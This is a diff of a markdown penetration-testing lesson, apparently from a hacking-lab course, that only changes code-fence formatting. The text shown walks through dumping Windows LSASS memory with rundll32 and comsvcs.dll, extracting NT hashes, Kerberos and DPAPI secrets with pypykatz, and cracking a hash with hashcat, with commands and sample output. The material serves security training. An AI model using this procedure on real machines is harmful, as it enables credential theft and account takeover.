@@ -40,8 +40,7 @@ Before issuing the command to create the dump file, we must determine what proce
 
 From cmd, we can issue the command `tasklist /svc` to find `lsass.exe` and its process ID.
 
-```
-        cmd
+```bat
 C:\Windows\system32> tasklist /svc
 
 Image Name                     PID Services
@@ -66,8 +65,7 @@ fontdrvhost.exe                812 N/A
 
 From PowerShell, we can issue the command `Get-Process lsass` and see the process ID in the `Id` field.
 
-```
-        powershell
+```powershell
 PS C:\Windows\system32> Get-Process lsass
 
 Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
@@ -81,8 +79,7 @@ Once we have the PID assigned to the LSASS process, we can create a dump file.
 
 With an elevated PowerShell session, we can issue the following command to create a dump file:
 
-```
-        powershell
+```powershell
 PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
 ```
 
@@ -102,8 +99,7 @@ Recall that LSASS stores credentials that have active logon sessions on Windows 
 
 The command initiates the use of `pypykatz` to parse the secrets hidden in the LSASS process memory dump. We use `lsa` in the command because LSASS is a subsystem of the `Local Security Authority`, then we specify the data source as a `minidump` file, proceeded by the path to the dump file stored on our attack host. Pypykatz parses the dump file and outputs the findings:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
 
 INFO:root:Parsing file /home/peter/Documents/lsass.dmp
@@ -198,8 +194,7 @@ Lets take a more detailed look at some of the useful information in the output.
 
 #### MSV
 
-```
-        shellsession
+```shellsession
 sid S-1-5-21-4019466498-1700476312-3544718034-1001
 luid 1354633
     == MSV ==
@@ -215,8 +210,7 @@ luid 1354633
 
 #### WDIGEST
 
-```
-        shellsession
+```shellsession
     == WDIGEST [14ab89]==
         username bob
         domainname DESKTOP-33E7O54
@@ -228,8 +222,7 @@ luid 1354633
 
 #### Kerberos
 
-```
-        shellsession
+```shellsession
     == Kerberos ==
         Username: bob
         Domain: DESKTOP-33E7O54
@@ -239,8 +232,7 @@ luid 1354633
 
 #### DPAPI
 
-```
-        shellsession
+```shellsession
     == DPAPI [14ab89]==
         luid 1354633
         key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
@@ -254,8 +246,7 @@ Mimikatz and Pypykatz can extract the DPAPI `masterkey` for logged-on users whos
 
 We can use Hashcat to crack the NT Hash. In this example, we only found one NT hash associated with the Bob user. After setting the mode in the command, we can paste the hash, specify a wordlist, and then crack the hash.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
 
 64f12cddaa88057e06a81b54e73b949b:Password1
